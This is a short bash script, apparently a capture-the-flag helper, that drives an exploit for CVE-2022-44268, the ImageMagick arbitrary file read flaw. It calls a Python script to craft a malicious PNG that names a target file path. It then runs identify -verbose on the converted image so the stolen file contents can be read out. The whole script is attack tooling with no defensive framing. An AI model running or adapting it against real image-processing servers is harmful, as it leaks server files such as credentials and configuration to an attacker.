#!/bin/bash

if [ $# -lt 1 ]; then 
    echo "arguments needed"
    exit 0

elif [ $# -eq 2 -a "$1" == "craft" ]; then
    python3 CVE-2022-44268.py -f "$2" -o exploit.png

elif [ "$1" == "result" ]; then
    # ./git-dumper/magick convert exploit.png result.png
    identify -verbose result.png
fi